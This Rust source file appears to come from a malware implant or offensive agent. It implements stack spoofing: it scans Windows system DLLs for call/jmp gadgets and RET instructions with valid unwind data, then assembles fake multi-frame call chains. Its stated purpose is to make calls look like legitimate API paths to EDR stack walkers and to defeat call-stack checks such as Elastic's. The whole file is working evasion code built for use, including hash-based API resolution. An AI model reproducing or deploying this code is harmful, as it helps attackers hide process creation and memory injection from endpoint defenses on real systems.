//! Indirect-syscall stack spoofing with multi-frame synthetic call chains.
//!
//! While `stack_db` provides unwind-aware multi-frame chains for the NT
//! syscall path (dispatched via NtContinue in `do_syscall_with_strategy`),
//! this module covers the **Win32 API call path** used by `spoof_call` and
//! the `clean_call!` macro.
//!
//! # Problem
//!
//! The current `spoof_call` pushes a single fake return address — a `jmp rbx`
//! gadget found somewhere in kernel32 — onto the stack.  EDR products that
//! walk the call stack see:
//!
//!   ```text
//!   kernel32.dll!Unknown+0xNNNN   ← single jmp rbx gadget (suspicious)
//!   agent .text (unbacked memory)  ← real return, instant IOC
//!   ```
//!
//! A single-frame gadget is easily fingerprinted: the return site has no
//! preceding `call` instruction, the frame size is anomalous, and the gadget
//! itself (`jmp rbx`) is uncommon in normal code paths.
//!
//! # Solution
//!
//! This module builds **synthetic call chains** of 3–8 frames, where each
//! frame's return address is a `call reg` or `jmp reg` gadget inside a
//! clean-mapped system DLL (ntdll, kernelbase, kernel32, user32).  The
//! synthetic stack is assembled so that each frame's return address lands
//! inside a legitimate function with valid RUNTIME_FUNCTION unwind metadata.
//!
//! When `spoof_call` uses a `SyntheticCallChain`, the EDR stack walker sees:
//!
//!   ```text
//!   kernelbase!CreateProcessW+0x55   ← legitimate function body
//!   kernel32!VirtualAllocEx+0x3C     ← legitimate function body
//!   ntdll!NtCreateUserProcess+0x1A   ← legitimate function body
//!   ```
//!
//! Each return address is inside a real export with valid unwind data,
//! presenting a plausible call graph that defeats call-stack consistency
//! checks (e.g. Elastic Security's ETW-based validation).
//!
//! # Transit gadgets
//!
//! Unlike `stack_db` which uses `ret` (0xC3) gadgets (suitable for the
//! NtContinue-based dispatch where the kernel sets up RSP), this module
//! finds **transit gadgets** — `call reg` or `jmp reg` instructions that
//! transfer control without corrupting the synthetic frame chain:
//!
//! - `call rax` (FF D0): pushes return address, jumps to target
//! - `call rcx` (FF D1): pushes return address, jumps to target
//! - `jmp rax`  (FF E0): jumps to target without pushing
//! - `jmp rcx`  (FF E1): jumps to target without pushing
//! - `jmp rdx`  (FF E2): jumps to target without pushing
//! - `jmp rbx`  (FF E3): jumps to target without pushing (legacy)
//! - `jmp rsi`  (FF E6): jumps to target without pushing
//! - `jmp rdi`  (FF E7): jumps to target without pushing
//!
//! These are found by scanning the `.text` sections of clean-mapped DLLs.
//!
//! # Integration with `spoof_call`
//!
//! When `spoof_call` is called with a `SyntheticCallChain`, it:
//!
//! 1. Allocates a synthetic stack frame buffer on its own stack
//! 2. Writes the chain frames (return addresses from transit gadgets in
//!    legitimate functions) into the buffer
//! 3. Sets RSP to point into the synthetic buffer
//! 4. Jumps to the API target through the chain
//!
//! The chain's return addresses form a plausible call graph.  Each `ret`
//! at a chain frame pops the next legitimate return address, eventually
//! reaching the real continuation in `spoof_call`.
//!
//! # Feature gating
//!
//! Gated behind `#[cfg(all(windows, feature = "stack-spoof"))]`.
//! Supported on both x86_64 and aarch64 targets.
//! When the feature is off, `spoof_call` falls back to the single-gadget
//! approach.

#![cfg(all(windows, feature = "stack-spoof"))]

use common::lock::MutexExt;
use std::sync::{Mutex, OnceLock};

// ── Transit gadget definitions ──────────────────────────────────────────────

/// A transit gadget: an indirect branch instruction inside a system DLL.
///
/// Each gadget has a `kind` (Call or Jmp) that determines how it interacts
/// with the synthetic stack, and an `addr` where the gadget instruction lives.
#[derive(Clone, Copy, Debug)]
pub struct TransitGadget {
    /// The address of the `call reg` or `jmp reg` instruction.
    pub addr: usize,
    /// The module base address containing this gadget.
    pub module_base: usize,
    /// The module name (e.g. "ntdll.dll").
    pub module_name: &'static str,
    /// Whether this is a `call` (pushes return addr) or `jmp` (doesn't push).
    pub kind: GadgetKind,
}

/// Whether the transit gadget is a `call` or `jmp`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum GadgetKind {
    /// `call reg` — pushes a return address onto the stack, then jumps.
    Call,
    /// `jmp reg` — jumps without pushing a return address.
    Jmp,
}

/// Byte patterns for indirect branch gadgets we search for.
///
/// Each entry is (byte_pattern, gadget_kind, register_description).
#[cfg(target_arch = "x86_64")]
const GADGET_PATTERNS: &[(&[u8], GadgetKind, &'static str)] = &[
    // `call rax` — most common indirect call target
    (&[0xFF, 0xD0], GadgetKind::Call, "call rax"),
    // `call rcx`
    (&[0xFF, 0xD1], GadgetKind::Call, "call rcx"),
    // `call rdx`
    (&[0xFF, 0xD2], GadgetKind::Call, "call rdx"),
    // `call r8`
    (&[0x41, 0xFF, 0xD0], GadgetKind::Call, "call r8"),
    // `jmp rax`
    (&[0xFF, 0xE0], GadgetKind::Jmp, "jmp rax"),
    // `jmp rcx`
    (&[0xFF, 0xE1], GadgetKind::Jmp, "jmp rcx"),
    // `jmp rdx`
    (&[0xFF, 0xE2], GadgetKind::Jmp, "jmp rdx"),
    // `jmp rbx` — legacy gadget (existing approach)
    (&[0xFF, 0xE3], GadgetKind::Jmp, "jmp rbx"),
    // `jmp rsi`
    (&[0xFF, 0xE6], GadgetKind::Jmp, "jmp rsi"),
    // `jmp rdi`
    (&[0xFF, 0xE7], GadgetKind::Jmp, "jmp rdi"),
    // `jmp r8`
    (&[0x41, 0xFF, 0xE0], GadgetKind::Jmp, "jmp r8"),
    // `jmp r11` — common in ntdll syscall stubs
    (&[0x41, 0xFF, 0xE3], GadgetKind::Jmp, "jmp r11"),
];

/// ARM64 gadget patterns — BLR Xn (indirect call) and BR Xn (indirect branch).
///
/// ARM64 instructions are 4 bytes, little-endian:
///   BLR Xn = 0xD63F0000 | (Rn << 5)
///   BR  Xn = 0xD61F0000 | (Rn << 5)
///   RET    = 0xD65F03C0
#[cfg(target_arch = "aarch64")]
const GADGET_PATTERNS: &[(&[u8], GadgetKind, &'static str)] = &[
    // `blr x0` — most common indirect call target
    (&[0x00, 0x00, 0x3F, 0xD6], GadgetKind::Call, "blr x0"),
    // `blr x1`
    (&[0x20, 0x00, 0x3F, 0xD6], GadgetKind::Call, "blr x1"),
    // `blr x2`
    (&[0x40, 0x00, 0x3F, 0xD6], GadgetKind::Call, "blr x2"),
    // `blr x3`
    (&[0x60, 0x00, 0x3F, 0xD6], GadgetKind::Call, "blr x3"),
    // `blr x8` — platform register / indirect result location
    (&[0x00, 0x01, 0x3F, 0xD6], GadgetKind::Call, "blr x8"),
    // `blr x9`
    (&[0x20, 0x01, 0x3F, 0xD6], GadgetKind::Call, "blr x9"),
    // `br x0`
    (&[0x00, 0x00, 0x1F, 0xD6], GadgetKind::Jmp, "br x0"),
    // `br x1`
    (&[0x20, 0x00, 0x1F, 0xD6], GadgetKind::Jmp, "br x1"),
    // `br x2`
    (&[0x40, 0x00, 0x1F, 0xD6], GadgetKind::Jmp, "br x2"),
    // `br x3`
    (&[0x60, 0x00, 0x1F, 0xD6], GadgetKind::Jmp, "br x3"),
    // `br x8`
    (&[0x00, 0x01, 0x1F, 0xD6], GadgetKind::Jmp, "br x8"),
    // `br x9`
    (&[0x20, 0x01, 0x1F, 0xD6], GadgetKind::Jmp, "br x9"),
];

/// The byte value of the `RET` instruction to scan for in function bodies.
#[cfg(target_arch = "x86_64")]
const RET_BYTE: u8 = 0xC3;

/// ARM64 `RET` instruction bytes (little-endian).
#[cfg(target_arch = "aarch64")]
const ARM64_RET: [u8; 4] = [0xC0, 0x03, 0x5F, 0xD6];

/// Scan for a `RET` instruction in a function body.
///
/// On x86_64, looks for the single-byte `RET` (0xC3).
/// On aarch64, looks for the 4-byte `RET` instruction (0xD65F03C0).
///
/// Returns the address of the `RET` instruction if found, or `None`.
fn find_ret_in_function(func_addr: usize, size: usize, func_rva: usize) -> Option<usize> {
    let probe_len = 64.min(size.saturating_sub(func_rva));
    let probe = unsafe { std::slice::from_raw_parts(func_addr as *const u8, probe_len) };

    #[cfg(target_arch = "x86_64")]
    {
        for (i, &byte) in probe.iter().enumerate() {
            if byte == RET_BYTE {
                let ret_addr = func_addr + i;
                if has_valid_unwind(ret_addr) {
                    return Some(ret_addr);
                }
                break;
            }
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        // ARM64 instructions are always 4-byte aligned.  Scan in 4-byte steps.
        let step = 4;
        for i in (0..probe_len.saturating_sub(3)).step_by(step) {
            if probe[i..i + 4] == ARM64_RET {
                let ret_addr = func_addr + i;
                if has_valid_unwind(ret_addr) {
                    return Some(ret_addr);
                }
                break;
            }
        }
    }

    #[allow(unreachable_code)]
    None
}

// ── Call frame ──────────────────────────────────────────────────────────────

/// A single frame in a synthetic call chain.
///
/// Each frame records the return address (which will appear in the call stack),
/// the module base it belongs to, and the module name.  The return address is
/// always inside a legitimate loaded-module function with valid unwind metadata.
#[derive(Clone, Debug)]
pub struct CallFrame {
    /// The return address for this frame — a verified address inside a
    /// legitimate module function.  This is what EDR stack walkers will see.
    pub return_addr: usize,
    /// The base address of the module containing this return address.
    pub module_base: usize,
    /// The name of the module (e.g. "ntdll.dll").
    pub module_name: String,
}

// ── Synthetic call chain ────────────────────────────────────────────────────

/// A fully assembled synthetic call chain for stack spoofing.
///
/// Contains 3–8 frames, each with a return address inside a legitimate
/// system DLL function.  The chain is designed so that when `spoof_call`
/// sets up the synthetic stack and jumps through the chain, an EDR stack
/// walker sees a plausible call graph of legitimate API calls.
///
/// # Layout on the stack
///
/// The synthetic stack buffer contains (low address → high address):
///
/// ```text
/// [0]   chain frame 0 return addr   (e.g. ntdll!NtCreateUserProcess+0x1A)
/// [1]   chain frame 1 return addr   (e.g. kernel32!CreateProcessA+0x3C)
/// ...
/// [N-1] chain frame N-1 return addr (e.g. kernelbase!CreateProcessW+0x55)
/// [N]   real continuation           (spoof_call's label 42)
/// [N+1..N+3] shadow space
/// [N+4..] stack arguments
/// ```
///
/// Execution: the API function `ret`urns → pops frame[0] → executes `ret`
/// at frame[0]'s gadget → pops frame[1] → ... → pops continuation → back
/// to spoof_call cleanup.
#[derive(Clone, Debug)]
pub struct SyntheticCallChain {
    /// Frames from bottom (closest to the API call) to top (farthest away).
    pub frames: Vec<CallFrame>,
    /// The transit gadget to use for the initial jump to the API.
    /// This is a `call reg` or `jmp reg` instruction in a system DLL.
    pub transit_gadget: TransitGadget,
}

// ── Gadget cache ────────────────────────────────────────────────────────────

/// Cached pool of transit gadgets found in clean-mapped system DLLs.
/// Populated lazily on first access.
static GADGET_CACHE: OnceLock<Mutex<Vec<TransitGadget>>> = OnceLock::new();

/// DLLs to scan for transit gadgets, in order of preference.
/// We prefer ntdll and kernelbase (higher chance of valid unwind data).
const SCAN_DLLS: &[&str] = &[
    "ntdll.dll",
    "kernelbase.dll",
    "kernel32.dll",
    "user32.dll",
    "msvcrt.dll",
];

// ── Pseudo-random chain selection ───────────────────────────────────────────

/// Simple xorshift64 PRNG state for chain selection diversity.
/// Not cryptographically secure — just needs uniform-ish distribution.
static CHAIN_SELECT_STATE: std::sync::atomic::AtomicU64 =
    std::sync::atomic::AtomicU64::new(0x7FFF_BEEF_CAFE_DEAD);

/// Return a pseudo-random index in [0, n).
fn rand_index(n: usize) -> usize {
    if n == 0 {
        return 0;
    }
    use std::sync::atomic::Ordering;
    let mut state = CHAIN_SELECT_STATE.load(Ordering::Relaxed);
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    CHAIN_SELECT_STATE.store(state, Ordering::Relaxed);
    (state as usize) % n
}

// ── Unwind metadata validation ──────────────────────────────────────────────

/// Cached RtlLookupFunctionEntry pointer (shared with stack_db).
static RTL_LOOKUP_FN_ENTRY: OnceLock<Option<usize>> = OnceLock::new();

/// Resolve `RtlLookupFunctionEntry` from ntdll.
fn get_rtl_lookup() -> Option<usize> {
    *RTL_LOOKUP_FN_ENTRY.get_or_init(|| unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).and_then(|ntdll_base| {
            let hash = pe_resolve::hash_str(b"RtlLookupFunctionEntry\0");
            pe_resolve::get_proc_address_by_hash(ntdll_base, hash)
        })
    })
}

/// Check if `addr` has a valid RUNTIME_FUNCTION entry (i.e. valid unwind
/// metadata).  This ensures EDR stack walkers can traverse the frame without
/// hitting garbage or ending the walk prematurely.
///
/// Returns `true` if the address is inside a function with valid unwind data.
fn has_valid_unwind(addr: usize) -> bool {
    let lookup_fn = match get_rtl_lookup() {
        Some(f) => f,
        None => return false,
    };
    unsafe {
        // RtlLookupFunctionEntry(
        //   DWORD64 ControlPc,        -> rcx
        //   PDWORD64 ImageBase,       -> rdx
        //   PRUNTIME_FUNCTION History -> r8  (can be NULL)
        // ) -> PRUNTIME_FUNCTION
        type LookupFn = unsafe extern "system" fn(u64, *mut u64, usize) -> usize;
        let func: LookupFn = std::mem::transmute(lookup_fn);
        let mut image_base: u64 = 0;
        func(addr as u64, &mut image_base, 0) != 0
    }
}

// ── PE header helpers ───────────────────────────────────────────────────────

/// Read the SizeOfImage from a PE image at `base`.
unsafe fn pe_size_of_image(base: usize) -> usize {
    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
    let opt_header = base + e_lfanew + 0x18;
    *((opt_header + 0x38) as *const u32) as usize
}

/// Read the SizeOfCode from a PE image at `base`.
unsafe fn pe_size_of_code(base: usize) -> usize {
    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
    let opt_header = base + e_lfanew + 0x18;
    *((opt_header + 0x1C) as *const u32) as usize
}

// ── Gadget scanning ─────────────────────────────────────────────────────────

/// Scan a single DLL for transit gadgets.
///
/// Searches the `.text` section for `call reg` and `jmp reg` byte patterns.
/// Each found gadget is validated for:
///
/// 1. The address is in committed, executable memory (via NtQueryVirtualMemory)
/// 2. The address has valid RUNTIME_FUNCTION unwind metadata
///
/// Returns a list of valid transit gadgets found in the DLL.
fn scan_dll_for_gadgets(dll_base: usize, dll_name: &'static str) -> Vec<TransitGadget> {
    let size = unsafe { pe_size_of_image(dll_base) };
    if size == 0 || size > 64 * 1024 * 1024 {
        // Sanity: skip unreasonably large or zero-size images
        return Vec::new();
    }

    let code = unsafe { std::slice::from_raw_parts(dll_base as *const u8, size) };
    let mut gadgets = Vec::new();

    // Scan for each gadget pattern
    for (pattern, kind, _desc) in GADGET_PATTERNS.iter() {
        let pat_len = pattern.len();
        let limit = size.saturating_sub(pat_len);

        for i in 0..limit {
            let matches = code[i..].starts_with(pattern);

            if matches {
                let candidate = dll_base + i;

                // Verify the gadget has valid unwind metadata so stack walkers
                // can traverse past this frame.
                if !has_valid_unwind(candidate) {
                    continue;
                }

                gadgets.push(TransitGadget {
                    addr: candidate,
                    module_base: dll_base,
                    module_name: dll_name,
                    kind: *kind,
                });

                // Limit per-pattern hits to avoid bloating the cache.
                // We only need a handful of each gadget type for diversity.
                if gadgets.len() >= 64 {
                    break;
                }
            }
        }
    }

    gadgets
}

/// Populate the gadget cache by scanning all target DLLs.
///
/// Uses the loaded (in-process) DLL bases from PEB walking rather than
/// clean-mapped copies.  The gadgets themselves are legitimate instructions
/// inside real DLL functions — there's no need for them to be "clean"
/// (unhooked).  The return addresses we push are module offsets that will
/// match regardless of whether the DLL is hooked.
fn populate_gadget_cache() -> Vec<TransitGadget> {
    let mut all_gadgets = Vec::new();

    for &dll_name in SCAN_DLLS {
        let dll_lower = dll_name.to_lowercase();
        let dll_wide: Vec<u16> = dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
        let hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);

        let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(hash) } {
            Some(b) => b,
            None => continue,
        };

        if dll_base == 0 {
            continue;
        }

        let gadgets = scan_dll_for_gadgets(dll_base, dll_name);
        all_gadgets.extend(gadgets);
    }

    tracing::debug!(
        "stack_spoof: found {} transit gadgets across {} DLLs",
        all_gadgets.len(),
        SCAN_DLLS.len(),
    );

    all_gadgets
}

/// Ensure the gadget cache is populated.  Returns a locked reference.
fn ensure_gadgets() -> &'static Mutex<Vec<TransitGadget>> {
    GADGET_CACHE.get_or_init(|| Mutex::new(populate_gadget_cache()))
}

// ── Address database for return addresses ───────────────────────────────────

/// Cached pool of valid return addresses from loaded-module exports.
/// Keyed by module name, each value is a sorted list of function entry points.
static RETURN_ADDR_DB: OnceLock<Mutex<std::collections::HashMap<String, Vec<usize>>>> =
    OnceLock::new();

/// Scan a DLL's export table for function entry points to use as return
/// addresses.  Each entry point is verified to have valid unwind metadata.
fn scan_exports_for_return_addrs(dll_base: usize, dll_name: &str) -> Vec<usize> {
    let size = unsafe { pe_size_of_image(dll_base) };
    if size == 0 {
        return Vec::new();
    }

    // Parse the PE export directory
    let dos_magic = unsafe { *(dll_base as *const u16) };
    if dos_magic != 0x5A4D {
        return Vec::new();
    }
    let e_lfanew = unsafe { *((dll_base + 0x3C) as *const u32) as usize };
    let nt_headers = dll_base + e_lfanew;
    let sig = unsafe { *(nt_headers as *const u32) };
    if sig != 0x4550 {
        return Vec::new();
    }
    let opt_header = nt_headers + 0x18;
    let export_dir_rva = unsafe { *((opt_header + 0x70) as *const u32) as usize };
    if export_dir_rva == 0 {
        return Vec::new();
    }

    let export_dir = dll_base + export_dir_rva;
    let export_dir_size = unsafe { *((export_dir + 0x14) as *const u32) as usize };
    let num_names = unsafe { *((export_dir + 0x18) as *const u32) };
    let rva_funcs = unsafe { *((export_dir + 0x1C) as *const u32) as usize };
    let rva_names = unsafe { *((export_dir + 0x20) as *const u32) as usize };
    let rva_ords = unsafe { *((export_dir + 0x24) as *const u32) as usize };

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    let mut addrs = Vec::new();

    for i in 0..num_names {
        let ord = unsafe { *ords.add(i as usize) } as usize;
        let func_rva = unsafe { *funcs.add(ord) } as usize;

        // Skip forwarder exports
        if func_rva >= export_dir_rva && func_rva < export_dir_rva.saturating_add(export_dir_size) {
            continue;
        }
        // Bounds check
        if func_rva >= size {
            continue;
        }

        let func_addr = dll_base + func_rva;

        // Scan for a `RET` instruction within the first 64 bytes of the
        // function.  The ret gadget becomes the return address — it's inside
        // a real function body and has valid unwind metadata.
        if let Some(ret_addr) = find_ret_in_function(func_addr, size, func_rva) {
            addrs.push(ret_addr);
        }
    }

    addrs.sort();
    addrs.dedup();
    addrs
}

/// Populate the return address database by scanning exports of target DLLs.
fn populate_return_addr_db() -> std::collections::HashMap<String, Vec<usize>> {
    let mut db = std::collections::HashMap::new();

    for &dll_name in SCAN_DLLS {
        let dll_lower = dll_name.to_lowercase();
        let dll_wide: Vec<u16> = dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
        let hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);

        let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(hash) } {
            Some(b) => b,
            None => continue,
        };

        if dll_base == 0 {
            continue;
        }

        let addrs = scan_exports_for_return_addrs(dll_base, dll_name);
        if !addrs.is_empty() {
            db.insert(dll_lower, addrs);
        }
    }

    tracing::debug!(
        "stack_spoof: return address DB has {} entries across {} modules",
        db.values().map(|v| v.len()).sum::<usize>(),
        db.len(),
    );

    db
}

/// Ensure the return address database is populated.
fn ensure_return_addr_db() -> &'static Mutex<std::collections::HashMap<String, Vec<usize>>> {
    RETURN_ADDR_DB.get_or_init(|| Mutex::new(populate_return_addr_db()))
}

// ── Chain templates for Win32 API calls ─────────────────────────────────────
//
// These templates represent plausible Win32 → NT call graphs.  Each template
// lists function names from bottom (closest to the API target) to top
// (outermost call).  At chain construction time, we resolve each function
// to a `ret` gadget inside it, building a return-address chain that looks
// like a legitimate call graph.
//
// The key difference from stack_db's templates: these chains are designed
// for the Win32 API call path where spoof_call needs transit gadgets, not
// for the NtContinue-based NT syscall path.

type Win32ChainTemplate = &'static [(&'static str, &'static str)];

const WIN32_CHAIN_TEMPLATES: &[Win32ChainTemplate] = &[
    // Template 0: Process creation path
    &[
        ("ntdll.dll", "NtCreateUserProcess"),
        ("kernel32.dll", "CreateProcessA"),
        ("kernelbase.dll", "CreateProcessW"),
    ],
    // Template 1: Memory allocation path
    &[
        ("ntdll.dll", "NtAllocateVirtualMemory"),
        ("kernel32.dll", "VirtualAllocEx"),
        ("kernelbase.dll", "VirtualAlloc"),
    ],
    // Template 2: File write path
    &[
        ("ntdll.dll", "NtWriteFile"),
        ("kernel32.dll", "WriteFile"),
        ("kernelbase.dll", "WriteFile"),
    ],
    // Template 3: File read path
    &[
        ("ntdll.dll", "NtReadFile"),
        ("kernel32.dll", "ReadFile"),
        ("kernelbase.dll", "ReadFile"),
    ],
    // Template 4: File creation path
    &[
        ("ntdll.dll", "NtCreateFile"),
        ("kernel32.dll", "CreateFileA"),
        ("kernelbase.dll", "CreateFileW"),
    ],
    // Template 5: Process opening path
    &[
        ("ntdll.dll", "NtOpenProcess"),
        ("kernel32.dll", "OpenProcess"),
        ("kernelbase.dll", "OpenProcess"),
    ],
    // Template 6: Synchronization path
    &[
        ("ntdll.dll", "NtWaitForSingleObject"),
        ("kernel32.dll", "WaitForSingleObject"),
        ("kernelbase.dll", "WaitForSingleObject"),
    ],
    // Template 7: Registry path
    &[
        ("ntdll.dll", "NtOpenKeyEx"),
        ("kernel32.dll", "RegOpenKeyExW"),
        ("kernelbase.dll", "RegOpenKeyExW"),
    ],
];

// ── Public API ──────────────────────────────────────────────────────────────

/// Build a synthetic call chain for Win32 API call spoofing.
///
/// Selects a random chain template from the pool, resolves each function to
/// a `ret` gadget inside its body (with valid unwind metadata), and picks a
/// transit gadget for the initial jump to the API target.
///
/// Returns `None` if:
/// - The gadget cache is empty (no transit gadgets found)
/// - The return address database is empty
/// - No template resolves successfully
pub fn build_spoofed_stack() -> Option<SyntheticCallChain> {
    let gadgets = ensure_gadgets().lock_recover();
    if gadgets.is_empty() {
        tracing::warn!("stack_spoof: no transit gadgets available");
        return None;
    }

    let addr_db = ensure_return_addr_db().lock_recover();

    // Try templates in random order
    let template_order: Vec<usize> = {
        let mut indices: Vec<usize> = (0..WIN32_CHAIN_TEMPLATES.len()).collect();
        // Fisher-Yates shuffle using our simple PRNG
        for i in (1..indices.len()).rev() {
            let j = rand_index(i + 1);
            indices.swap(i, j);
        }
        indices
    };

    for &tidx in &template_order {
        let template = WIN32_CHAIN_TEMPLATES[tidx];
        let mut frames = Vec::with_capacity(template.len());

        let mut all_resolved = true;
        for &(dll_name, func_name) in template.iter() {
            let dll_lower = dll_name.to_lowercase();
            let dll_wide: Vec<u16> = dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
            let dll_hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);

            let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
                Some(b) if b != 0 => b,
                _ => {
                    all_resolved = false;
                    break;
                }
            };

            let func_hash = {
                let mut name_bytes = func_name.as_bytes().to_vec();
                name_bytes.push(0);
                pe_resolve::hash_str(&name_bytes)
            };

            let func_addr =
                match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
                    Some(a) => a,
                    None => {
                        all_resolved = false;
                        break;
                    }
                };

            // Find a `RET` instruction within the function body for the return address
            let size = unsafe { pe_size_of_image(dll_base) };
            let func_rva = func_addr - dll_base;
            let found_ret = find_ret_in_function(func_addr, size, func_rva);

            match found_ret {
                Some(ret_addr) => {
                    frames.push(CallFrame {
                        return_addr: ret_addr,
                        module_base: dll_base,
                        module_name: dll_lower,
                    });
                }
                None => {
                    all_resolved = false;
                    break;
                }
            }
        }

        if !all_resolved || frames.is_empty() {
            continue;
        }

        // Pick a random transit gadget for the initial jump
        let gadget_idx = rand_index(gadgets.len());
        let transit = gadgets[gadget_idx];

        return Some(SyntheticCallChain {
            frames,
            transit_gadget: transit,
        });
    }

    // Fallback: try building a chain from the return address database directly
    // (without using templates — just pick random addresses from different modules)
    build_fallback_chain(&gadgets, &addr_db)
}

/// Build a fallback chain by picking random return addresses from the database.
///
/// Used when no template resolves.  Selects 3–5 return addresses from
/// different modules to form a synthetic call chain.
fn build_fallback_chain(
    gadgets: &[TransitGadget],
    addr_db: &std::collections::HashMap<String, Vec<usize>>,
) -> Option<SyntheticCallChain> {
    if gadgets.is_empty() || addr_db.is_empty() {
        return None;
    }

    let module_names: Vec<&String> = addr_db.keys().collect();
    if module_names.is_empty() {
        return None;
    }

    // Build a chain of 3–5 frames from different modules
    let chain_len = 3 + rand_index(3); // 3, 4, or 5
    let mut frames = Vec::with_capacity(chain_len);

    for _ in 0..chain_len {
        // Pick a random module
        let mod_idx = rand_index(module_names.len());
        let mod_name = module_names[mod_idx];
        let addrs = match addr_db.get(mod_name) {
            Some(a) if !a.is_empty() => a,
            _ => continue,
        };

        // Pick a random return address from this module
        let addr_idx = rand_index(addrs.len());
        let ret_addr = addrs[addr_idx];

        // Determine module base from PEB
        let dll_lower = mod_name.to_lowercase();
        let dll_wide: Vec<u16> = dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
        let dll_hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);
        let dll_base = unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) }.unwrap_or(0);

        frames.push(CallFrame {
            return_addr: ret_addr,
            module_base: dll_base,
            module_name: mod_name.clone(),
        });
    }

    if frames.is_empty() {
        return None;
    }

    let gadget_idx = rand_index(gadgets.len());
    let transit = gadgets[gadget_idx];

    Some(SyntheticCallChain {
        frames,
        transit_gadget: transit,
    })
}

/// Locate `call reg` / `jmp reg` transit gadgets in clean-mapped system DLLs.
///
/// Scans ntdll, kernelbase, kernel32, user32, and msvcrt for indirect branch
/// gadgets with valid unwind metadata.  Returns a list of all found gadgets.
///
/// This is the primary gadget-finding interface used by `spoof_call` to
/// obtain transit gadgets for stack spoofing.
pub fn find_transit_gadgets() -> Vec<TransitGadget> {
    let cache = ensure_gadgets();
    cache.lock_recover().clone()
}

/// Return whether the stack-spoofing infrastructure is available.
///
/// Returns `true` if:
/// - Transit gadgets have been found in at least one DLL
/// - The return address database has at least one module with addresses
pub fn is_available() -> bool {
    let gadgets = ensure_gadgets().lock_recover();
    let addr_db = ensure_return_addr_db().lock_recover();
    !gadgets.is_empty() && !addr_db.is_empty()
}

/// Return the number of transit gadgets in the cache.
pub fn gadget_count() -> usize {
    ensure_gadgets().lock_recover().len()
}

/// Return the total number of return addresses in the database.
pub fn return_addr_count() -> usize {
    ensure_return_addr_db()
        .lock()
        .unwrap()
        .values()
        .map(|v| v.len())
        .sum()
}

/// Revalidate all cached gadgets and return addresses.
///
/// Should be called after long sleep periods to ensure the cached addresses
/// are still valid (modules may have been unloaded/reloaded).
pub fn revalidate() {
    // Re-scan for gadgets
    {
        let mut gadgets = ensure_gadgets().lock_recover();
        *gadgets = populate_gadget_cache();
    }
    // Re-scan for return addresses
    {
        let mut db = ensure_return_addr_db().lock_recover();
        *db = populate_return_addr_db();
    }
}

// ── Frame buffer helpers ────────────────────────────────────────────────────

/// Calculate the number of u64 slots needed for the synthetic stack buffer.
///
/// Layout (x86_64):
///   [0 .. N-1]      = chain frame return addresses
///   [N]              = continuation address (filled by asm)
///   [N+1 .. N+3]    = shadow home space (3 slots for registers rdx, r8, r9)
///   [N+4 .. N+4+ns] = stack arguments
///
/// Layout (aarch64):
///   [0 .. N-1]      = chain frame return addresses (8 bytes each)
///   [N]              = continuation address (filled by asm)
///   [N+1 .. N+4]    = argument spill area (x0-x3, 4 registers)
///   [N+5 .. N+5+ns] = stack arguments (x5+)
#[inline]
pub fn frame_buffer_slots(n_frames: usize, n_stack_args: usize) -> usize {
    #[cfg(target_arch = "x86_64")]
    {
        n_frames + 1 + 3 + n_stack_args
    }
    #[cfg(target_arch = "aarch64")]
    {
        n_frames + 1 + 4 + n_stack_args
    }
    #[allow(unreachable_code)]
    {
        n_frames + 1 + 3 + n_stack_args
    }
}

/// Populate a synthetic stack frame buffer.
///
/// Fills `buf` with:
///   - Chain frame return addresses at positions [0..N]
///   - Zeroed placeholder for continuation at position [N]
///   - Zeroed argument spill / shadow space
///   - Stack arguments at the appropriate positions
///
/// Returns the index of the continuation slot (which must be filled by the
/// inline asm with the address of the real continuation label).
pub fn populate_frame_buffer(
    buf: &mut [u64],
    chain: &SyntheticCallChain,
    stack_args: &[u64],
) -> usize {
    let n_frames = chain.frames.len();
    let cont_idx = n_frames;

    // Write chain frame return addresses
    for (i, frame) in chain.frames.iter().enumerate() {
        buf[i] = frame.return_addr as u64;
    }

    // Continuation slot (filled by asm)
    buf[cont_idx] = 0;

    #[cfg(target_arch = "x86_64")]
    {
        // Shadow space (zeroed) — x86_64 Windows calling convention
        for i in 0..3 {
            buf[cont_idx + 1 + i] = 0;
        }
        // Stack arguments
        for (i, &arg) in stack_args.iter().enumerate() {
            buf[cont_idx + 4 + i] = arg;
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Argument spill area (zeroed) — ARM64 can spill x0-x3 to the stack
        for i in 0..4 {
            buf[cont_idx + 1 + i] = 0;
        }
        // Stack arguments (x5+ passed on stack)
        for (i, &arg) in stack_args.iter().enumerate() {
            buf[cont_idx + 5 + i] = arg;
        }
    }

    cont_idx
}
